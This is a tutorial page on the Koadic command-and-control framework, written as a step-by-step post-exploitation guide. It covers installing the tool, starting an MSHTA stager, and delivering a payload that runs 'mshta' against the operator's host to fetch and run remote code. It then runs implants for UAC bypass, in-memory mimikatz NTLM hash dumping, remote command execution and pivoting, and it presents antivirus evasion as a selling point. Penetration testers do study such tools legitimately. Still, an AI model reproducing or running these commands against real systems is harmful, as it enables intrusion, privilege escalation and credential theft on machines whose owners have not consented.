# Koadic

PowerShell was a really great playground in the grove. But nowadays, and outside-of-the-testlab-box, even if you 
encode the PowerShell command into base64 or any other encoder, the payload delivery still get detected by hard 
implementation of the group policies and by AntiVirus with ML and AI, which detects the intrusion by a mere execution 
of the `powershell.exe` program.

* Koadic does not use PowerShell for post-exploitation, it supports scripting such as VBScript and JScript. 
* Koadic does not rely on TCP connections for continuous communication. The connection is maintained by requesting
multiple HTTP connections.
* An implant is a JavaScript or a VBScript code, to be executed by zombies to perform a certain task, like the post 
modules in Metasploit. The implants are categorised: pivot, persistence, manage, utils, elevate, gather, scan, fun, 
and inject.

## Requirements

Python package version 2 or 3

## Installation

### On Kali

     sudo apt install koadic

### On other *nix

    git clone https://github.com/zerosum0x0/koadic

Install the python packages koadic depends on:

    sudo pip install -r requirement.txt

Start her up with:

    ./koadic

Koadic starts with the MSHTA stager as the default stager. The Microsoft HTML 
Application (MSHTA) is a full-grown Microsoft Windows HTML application that is trusted 
by the developer who creates it. It's like the Internet Explorer browser but without the user 
interface or any strict security model. It displays only a few options, such as menus, icons, 
title information, and toolbars.

## A Koadic-style post-exploitation

### Stager Establishment

Set up the stager web server where the zombie will get connected.

To show the information for the current stager:

    (koadic: sta/js/mshta)$ info

To change these settings, use the `set` command (just like in Metasploit and Empire), for example:

    (koadic: sta/js/mshta)$ set SRVPORT 8080

To start the stager web server: 

    (koadic: sta/js/mshta)$ run

### Payload Execution

Drop the payload over to the target server and execute the payload to get the zombie hooked up by Koadic.

Different means of transport can be used to deliver the payload over to the target system (MS Word, PDF, EXE, DLL, 
...) and when the payload is executed on the target server, the `mshta http://192.168.122.108:8080/MDRV9` (but then
with your LHOST address) command is executed, and the stager hooks up the zombie. Koadic C2 will be notified when 
the zombie is connected.

Check your zombies with:

    (koadic: sta/js/mshta)$ zombies

This shows a zombies' ID (assigned by C2), IP, STATUS, and LAST SEEN. For more detail on a particular zombie:

    (koadic: sta/js/mshta)$ zombies <ID>

### Running Implants

Execute the implants to get domain information, SYSTEM access, and NTLM hashes. These can be used for further post-exploitation.

The `bypassuac_eventvwr` implant can be used for escalating privileges from ring 3 (user land privs) to SYSTEM.

    (koadic: sta/js/mshta)$ use implant/elevate/bypassuac_eventvwr
    (koadic: imp/ele/bypassuac_eventvwr)$ info

Get the payload `ID` from the `listeners` command, and set option

    (koadic: imp/ele/bypassuac_eventvwr)$ set payload <ID>

Execute implant on target: 

    (koadic: imp/ele/bypassuac_eventvwr)$ run

A new connection is created with the elevated privileges. Use the implant for dumping hash or for using mimikatz. 
Koadic injects the mimikatz DLL directly in memory:

    (koadic: imp/ele/bypassuac_eventvwr)$ use implant/inject/mimikatz_dynwrapx
    (koadic: imp/inj/mimikatz_dynwrapx)$ run

Run again to get the results:

    (koadic: imp/inj/mimikatz_dynwrapx)$ run

This brings the NTLM hashes, which can further be used in pivoting.

To execute a command on a zombie:

    (koadic: imp/inj/mimikatz_dynwrapx)$ use implant/manage/exec_cmd
    (koadic: imp/man/exec_cmd)$ info

Set "net user"

    (koadic: imp/man/exec_cmd)$ set cmd "net user"
    (koadic: imp/man/exec_cmd)$ run

### Pivoting

Hook the zombie and move around the network through it.